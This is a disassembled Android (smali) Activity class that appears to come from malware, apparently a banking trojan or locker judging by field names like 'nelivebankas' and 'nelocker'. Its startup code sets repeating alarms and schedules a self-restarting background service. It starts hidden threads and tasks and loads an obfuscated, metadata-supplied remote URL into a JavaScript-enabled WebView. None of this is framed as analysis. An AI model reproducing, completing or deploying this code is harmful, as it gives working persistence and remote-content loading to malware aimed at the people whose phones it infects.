.class public Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;
.super Landroid/app/Activity;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private nelivebankas:Landroid/webkit/WebView;

.field private nelocker:Ljava/lang/String;

.field private pincodeses:Landroid/app/AlarmManager;

.field private pmonkeyen:Landroid/content/Intent;

.field private swift:Landroid/app/PendingIntent;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method static synthetic docoderm(Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 1

    invoke-direct {p0, p1, p2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->pretools(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    return v0
.end method

.method private pretools(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 2

    const/4 v0, 0x1

    const/4 v1, 0x1

    :try_start_0
    invoke-virtual {p2, p1, v1}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8

    const/4 v7, 0x1

    const/4 v1, 0x0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->pincodeses:Landroid/app/AlarmManager;

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/WewuwarWndr;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->pmonkeyen:Landroid/content/Intent;

    iget-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->pmonkeyen:Landroid/content/Intent;

    invoke-static {p0, v1, v0, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->swift:Landroid/app/PendingIntent;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    iget-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->pincodeses:Landroid/app/AlarmManager;

    const-wide/32 v4, 0x2bf20

    iget-object v6, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->swift:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    const-string v0, "dfgfdgdf"

    invoke-virtual {p0, v0, v1}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "start"

    const-string v3, "pusto"

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "start"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->finish()V

    :goto_0
    return-void

    :cond_0
    :try_start_0
    new-instance v0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/g;

    invoke-direct {v0, p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/g;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "davai"

    aput-object v4, v2, v3

    invoke-virtual {v0, v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/g;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/c;

    invoke-direct {v2, p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/c;-><init>(Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/d;

    invoke-direct {v2, p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/d;-><init>(Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    new-instance v0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/b;

    invoke-direct {v0, p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/b;-><init>(Landroid/app/Activity;)V

    invoke-static {v0}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :goto_1
    const v0, 0x7f030001

    invoke-virtual {p0, v0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->setContentView(I)V

    invoke-virtual {p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    :try_start_1
    invoke-virtual {p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x80

    invoke-virtual {v0, v2, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v2, "pupurupu"

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelocker:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_2
    const v0, 0x7f070004

    invoke-virtual {p0, v0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelivebankas:Landroid/webkit/WebView;

    iget-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelivebankas:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v7}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelivebankas:Landroid/webkit/WebView;

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/f;

    invoke-direct {v2, p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/f;-><init>(Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;)V

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    const-string v0, "tp"

    iget-object v2, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelivebankas:Landroid/webkit/WebView;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "ht"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "://"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v3, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->nelocker:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getBaseContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v0}, Landroid/content/Intent;->getFlags()I

    move-result v3

    invoke-static {v2, v1, v0, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-virtual {p0}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/E;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "alarm"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v4, 0xea60

    add-long/2addr v2, v4

    invoke-virtual {v0, v7, v2, v3, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    goto/16 :goto_1
.end method
